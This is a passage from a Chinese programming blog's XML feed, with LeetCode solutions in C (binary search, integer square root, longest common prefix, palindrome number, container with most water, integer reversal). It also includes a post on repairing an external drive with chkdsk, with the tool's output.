 <span class="comment">//左边界</span></span><br><span class="line">    <span class="type">int</span> right = x; <span class="comment">//右边界</span></span><br><span class="line">    <span class="type">long</span> mid = <span class="number">0</span>;  <span class="comment">//中间值</span></span><br><span class="line">    <span class="type">int</span> ans=<span class="number">-1</span>;    <span class="comment">//平方根整数部分</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right){</span><br><span class="line">        mid = left + (right - left) / <span class="number">2</span>; <span class="comment">//防止溢出</span></span><br><span class="line">        <span class="keyword">if</span>(mid * mid &lt;= x){</span><br><span class="line">            ans = mid;   <span class="comment">//更新ans的值</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> right = mid - <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>类似题目：<a href="https://leetcode.cn/problems/valid-perfect-square/">有效的完全平方数</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二分查找</title>
    <link href="/2023/12/30/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <url>/2023/12/30/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>今天开始LeetCode刷题之旅，使用的是<a href="https://programmercarl.com/">代码随想录</a></p><p>题目地址：https://leetcode.cn/problems/binary-search/</p><p><strong>二分查找</strong>一般用于有序数组，根据<strong>边界</strong>条件一般分为两种情况：</p><ul><li>左闭右闭——[left, right]</li><li>左闭右开——[left, right)</li></ul><p>可用递归实现，也可使用循环(更高效)实现。由于这题给定的参数不方便使用递归，所以下面讨论在<strong>左闭右闭</strong>情况下使用<strong>循环</strong>来实现（C语言）：</p><p>在左闭右闭情况下，<code>left</code>可以等于<code>right</code>，因此<code>while</code>循环的条件是<code>left &lt;= right</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>; <span class="comment">//左边界</span></span><br><span class="line">    <span class="type">int</span> right = numsSize<span class="number">-1</span>; <span class="comment">//右边界</span></span><br><span class="line">    <span class="type">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right){</span><br><span class="line">        mid = (left + right)/<span class="number">2</span>; <span class="comment">//中间元素下标</span></span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target){</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target){ <span class="comment">//如果target小于中间元素，则在左半部分继续查找</span></span><br><span class="line">            right = mid - <span class="number">1</span>; <span class="comment">//修改右边界</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid + <span class="number">1</span>; <span class="comment">//修改左边界</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>左闭右开情况下，<code>while</code>循环的条件是<code>left &lt; right</code></p><p>注：本题强调<strong>数组中无重复元素</strong>，所以返回值只有一个</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移动硬盘修复</title>
    <link href="/2023/11/23/%E7%A3%81%E7%9B%98%E4%BF%AE%E5%A4%8D/"/>
    <url>/2023/11/23/%E7%A3%81%E7%9B%98%E4%BF%AE%E5%A4%8D/</url>
    
    <content type="html"><![CDATA[<p>21号晚上，考研复习，插上移动硬盘，准备看看英语作文，结果提示音响了两次，文件资源管理器卡死。</p><p>重启后，发现电脑能够识别硬盘，但是只有个盘符，不显示磁盘容量，右键查看相关信息也为空。开始慌了，网上开始查解决方案，清一色使用<strong>DiskGenius</strong>修复。</p><p>回宿舍后开始下载DiskGenius专业版（只有专业版有相关功能），打开软件后，显示硬盘损坏，尝试“恢复文件”，确实扫描出了所有文件，但是电脑还是识别不了硬盘；尝试“扫描坏道”，结果未发现坏道<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>重新搜索，突然想到好像Windows有相关的命令可以修复硬盘，参考这个<a href="https://www.zhihu.com/question/51203528">知乎回答</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chkdsk G:/f    (G为盘符)</span><br></pre></td></tr></tbody></table></figure><p>运行后回显如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">文件系统的类型是 NTFS。</span><br><span class="line">卷标是 hxt616。</span><br><span class="line"></span><br><span class="line">阶段 1: 检查基本文件系统结构...</span><br><span class="line">  已处理 120320 个文件记录。</span><br><span class="line">文件验证完成。</span><br><span class="line"> 阶段持续时间 (文件记录验证): 1.72 秒。</span><br><span class="line">  已处理 119 个大型文件记录。</span><br><span class="line"> 阶段持续时间 (孤立文件记录恢复): 0.00 毫秒。</span><br><span class="line">  已处理 0 个错误的文件记录。</span><br><span class="line"> 阶段持续时间 (文件记录检查错误): 0.22 毫秒。</span><br><span class="line"></span><br><span class="line">阶段 2: 检查文件名链接...</span><br><span class="line">正在更正文件 5 索引 $I30 的错误。</span><br><span class="line">CHKDSK 在文件 5 的索引 $I30 的卷位图中发现标记为已分配的可用空间。</span><br><span class="line">正在对文件 5 中的索引 $I30 进行排序。</span><br><span class="line">  已处理 323 个重新解析记录。</span><br><span class="line">  已处理 133520 个索引项。</span><br><span class="line">索引验证完成。</span><br><span class="line"> 阶段持续时间 (索引验证): 3.95 秒。</span><br><span class="line">CHKDSK 正在扫描未编制索引的文件以便重新连接到其原始目录。</span><br><span class="line">正在将孤立文件 $MFT (0)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $MFTMirr (1)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $LogFile (2)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $Volume (3)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $AttrDef (4)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 . (5)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $Bitmap (6)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $Boot (7)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $BadClus (8)恢复到目录文件 5。</span><br><span class="line">正在将孤立文件 $Secure (9)恢复到目录文件 5。</span><br><span class="line">正在跳过有关恢复孤立项的进一步消息。</span><br><span class="line">  已扫描到 27 个未索引文件。</span><br><span class="line">  已将 27 个未编制索引的文件恢复到原始目录。</span><br><span class="line"> 阶段持续时间 (孤立文件重新连接): 0.00 毫秒。</span><br><span class="line">  已将 0 个未编制索引的文件恢复到回收箱。</span><br><span class="line"> 阶段持续时间 (孤立文件恢复到回收箱): 5.66 毫秒。</span><br><span class="line">  已处理 323 个重新解析记录。</span><br><span class="line"> 阶段持续时间 (重分析点和对象 ID 验证): 5.06 毫秒。</span><br><span class="line"></span><br><span class="line">阶段 3: 检查安全描述符...</span><br><span class="line">安全描述符验证完成。</span><br><span class="line"> 阶段持续时间 (安全描述符验证): 2.66 毫秒。</span><br><span class="line">  已处理 6601 个数据文件。</span><br><span class="line"> 阶段持续时间 (数据属性验证): 0.50 毫秒。</span><br><span class="line">CHKDSK 正在验证 Usn 日志...</span><br><span class="line">Usn 日志验证完成。</span><br><span class="line">正在更正主文件表(MFT)镜像的错误。</span><br><span class="line">正在更正主文件表(MFT) BITMAP 属性的错误。</span><br><span class="line">正在更正卷位图的错误。</span><br><span class="line"></span><br><span class="line">Windows 已更正文件系统。</span><br><span class="line">无需采取进一步操作。</span><br><span class="line"></span><br><span class="line">总共有  500105215 KB 磁盘空间。</span><br><span class="line">113401 个文件中有  396362324 KB。</span><br><span class="line">6602 个索引      49956 KB。</span><br><span class="line">坏扇区          0 KB。</span><br><span class="line">系统正在使用     201563 KB。</span><br><span class="line">日志文件占用了      65536 KB。</span><br><span class="line">磁盘上  103491372 KB 可用。</span><br><span class="line"></span><br><span class="line">每个分配单元中有       4096 字节。</span><br><span class="line">磁盘上共有  125026303 个分配单元。</span><br><span class="line">磁盘上有   25872843 个可用的分配单元。</span><br><span class="line">总持续时间: 5.86 秒 (5862 毫秒)。</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>硬盘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>硬盘修复</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最长公共前缀</title>
    <link href="/2023/07/18/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"/>
    <url>/2023/07/18/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/longest-common-prefix/</p><blockquote><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 <code>""</code>。</p><p><strong>示例 ：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：strs = ["flower","flow","flight"]</span><br><span class="line">输出："fl"</span><br></pre></td></tr></tbody></table></figure></blockquote><p>又是因为基础不扎实找了半天bug<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>。</p><p>例如下面这段代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">char</span> *str[] = {<span class="string">"Hello"</span>,<span class="string">"world"</span>};</span><br><span class="line">    <span class="type">char</span> *ptr = str[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改字符数组元素</span></span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="string">'J'</span>;  <span class="comment">//报错</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>当声明一个字符指针数组<code>str[]</code>并初始化它为字符串常量时，每个元素都是一个指向字符串常量的指针。这意味着我们不能直接修改字符串常量中的字符。这时应该使用<code>malloc</code>函数开辟一片空间存放该字符串的副本，然后进行修改，可参考下面的完整代码。</p><p>完整代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> * <span class="title function_">longestCommonPrefix</span><span class="params">(<span class="type">char</span> ** strs, <span class="type">int</span> strsSize)</span>{</span><br><span class="line">    <span class="type">char</span>* all = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(strs[<span class="number">0</span>]) + <span class="number">1</span>); <span class="comment">// 分配空间</span></span><br><span class="line">    <span class="built_in">strcpy</span>(all, strs[<span class="number">0</span>]); <span class="comment">//存放strs[0]的副本</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> t; <span class="comment">//存放当前比较的字符</span></span><br><span class="line">    <span class="type">int</span> flag = <span class="number">1</span>; <span class="comment">//判断是否不匹配</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(strs[<span class="number">0</span>]); j++) {</span><br><span class="line">        t = strs[<span class="number">0</span>][j];</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; strsSize&amp;&amp; j &lt; <span class="built_in">strlen</span>(strs[i]); i++) { <span class="comment">//for的条件语句判断是否溢出</span></span><br><span class="line">            <span class="keyword">if</span> (strs[i][j] != t) {</span><br><span class="line">                flag = <span class="number">0</span>;  <span class="comment">//当字符不匹配时，flag=0</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (i &lt; strsSize&amp;&amp;j &gt;= <span class="built_in">strlen</span>(strs[i])) <span class="comment">//当下标溢出时，flag=0，方便退出循环</span></span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    all[j] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> all;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>回文数</title>
    <link href="/2023/07/12/%E5%9B%9E%E6%96%87%E6%95%B0/"/>
    <url>/2023/07/12/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/palindrome-number/</p><blockquote><p>给你一个整数 <code>x</code> ，如果 <code>x</code>是一个回文整数，返回 <code>true</code> ；否则，返回 <code>false</code>。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><ul><li>例如，<code>121</code> 是回文，而 <code>123</code> 不是。</li></ul><p><strong>示例 ：</strong></p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 121</span><br><span class="line">输出：true</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>提示：</strong></p><ul><li><span class="math inline">\(−2^{31}≤X≤2^{31}−1\)</span></li></ul></blockquote><p>通过这题我发现了我对<code>for</code>循环的运行顺序的理解不正确（说到底还是基础不牢<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）</p><ul><li><p><code>for</code>循环的运行顺序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++) </span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>i=0</code> ——&gt; <code>i&lt;100</code> ——&gt;<code>printf</code> ——&gt; <code>i++</code> ——&gt; <code>i&lt;100</code>——&gt; <code>printf</code> ——&gt; <code>i++</code> ...</p><p>最后打印的<code>i</code>的值为<code>99</code>，而<code>i</code>的真实值为<code>100</code>。</p></li></ul><p>完整代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span>{</span><br><span class="line">    <span class="type">int</span> c[<span class="number">10</span>]={<span class="number">0</span>};    <span class="comment">//这里根据x的取值范围，最多为10位数</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; x!=<span class="number">0</span>; i++){</span><br><span class="line">            c[i] = x%<span class="number">10</span>;</span><br><span class="line">            x/=<span class="number">10</span>;</span><br><span class="line">        }</span><br><span class="line">        i-=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;i-j; j++){  <span class="comment">//分别从首尾向中间元素移动进行比较</span></span><br><span class="line">                <span class="keyword">if</span>(c[j]!=c[i-j])</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>盛最多水的容器</title>
    <link href="/2023/07/11/%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/"/>
    <url>/2023/07/11/%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/container-with-most-water/</p><blockquote><p>给定一个长度为 <code>n</code> 的整数数组 <code>height</code> 。有<code>n</code> 条垂线，第 <code>i</code> 条线的两个端点是<code>(i, 0)</code> 和 <code>(i, height[i])</code> 。</p><p>找出其中的两条线，使得它们与 <code>x</code>轴共同构成的容器可以容纳最多的水。</p><p>返回容器可以储存的最大水量。</p><p><strong>说明：</strong>你不能倾斜容器。</p><p><strong>示例 ：</strong></p><figure><img src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入：[1,8,6,2,5,4,8,3,7]</span><br><span class="line">&gt;输出：49 </span><br><span class="line">&gt;解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。</span><br></pre></td></tr></tbody></table></figure></blockquote><p>这题的主要就是使用双指针的思想。分析可知矩形面积取决于两个垂直线中较短的那条，若是移动较长的垂直线，则面积是一定减小的，所以<strong>每次移动较短的垂直线</strong>，这样面积的变化才是有可能是增大的。</p><p>完整代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>* height, <span class="type">int</span> heightSize)</span>{</span><br><span class="line">    <span class="type">int</span> first=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> last = heightSize<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> smax=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;first&lt;last;){</span><br><span class="line">        s = (height[first] &lt;= height[last] ? height[first] : height[last]) * (last-first); <span class="comment">//矩形面积</span></span><br><span class="line">        <span class="keyword">if</span>(smax &lt; s)</span><br><span class="line">            smax = s;</span><br><span class="line">        <span class="keyword">if</span>(height[first]&lt;height[last]) <span class="comment">//找出较短的垂直线</span></span><br><span class="line">            first+=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            last-=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> smax;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整数反转</title>
    <link href="/2023/07/11/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/"/>
    <url>/2023/07/11/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/reverse-integer/</p><p>这算是一道简单题，我最后还是参考官方题解才做出来<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><blockquote><p>给你一个 32 位的有符号整数 <code>x</code> ，返回将 <code>x</code>中的数字部分反转后的结果。</p><p>如果反转后整数超过 32 位的有符号整数的范围 <span class="math inline">\([−2^{31},2^{31}−1]\)</span> ，就返回 0。</p><p><strong>假设环境不允许存储 64 位整数（有符号或无符号）。</strong></p><p><strong>示例 ：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x = 123</span><br><span class="line">输出：321</span><br></pre></td></tr></tbody></table></figure></blockquote><p>int类型表示的范围：<strong>-2147483648</strong> ~<strong>2147483647</strong></p><p>这里不能在算出结果后再比较结果是否溢出，因为题目要求不允许使用64位整数，即运算过程中的数字必须在32位有符号整数的范围内，所以在计算过程中可能会直接溢出报错。</p><p>这里使用如下思想：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 弹出 x 的末尾数字 digit</span></span><br><span class="line">digit = x % <span class="number">10</span></span><br><span class="line">x /= <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数字 digit 推入 rev 末尾</span></span><br><span class="line">rev = rev * <span class="number">10</span> + digit</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>首先题目要求输入必须是32位int类型，所以不用对输入进行范围判断。假设输入正数<strong>2147483645</strong>，此时反转到最后一个数字前，<code>rev</code>的值为<strong>546384741</strong>，现在还剩最后一个数字，需要执行这句<code>rev = rev * 10 + digit</code>，但在乘以10时就已经溢出报错了，所以该代码不能执行，因此需要在每次循环执行<code>rev = rev * 10 + digit</code>前判断<code>rev</code>的范围是否满足：<span class="math display">\[⌈\frac{−2^{31}}{10}⌉≤rev≤⌊\frac{2^{31}−1}{10}⌋\]</span> 完整代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span>{</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>){</span><br><span class="line">        <span class="keyword">if</span>(t&lt;INT_MIN/<span class="number">10</span> || t&gt;INT_MAX/<span class="number">10</span>){ <span class="comment">//INT_MIN 和 INT_MAX 对应最小值和最大值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        t = t*<span class="number">10</span> + x%<span class="number">10</span>;</span><br><span class="line">        x/=<span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寻找两个正序数组的中位数</title>
    <link href="/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/"/>
    <url>/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
    
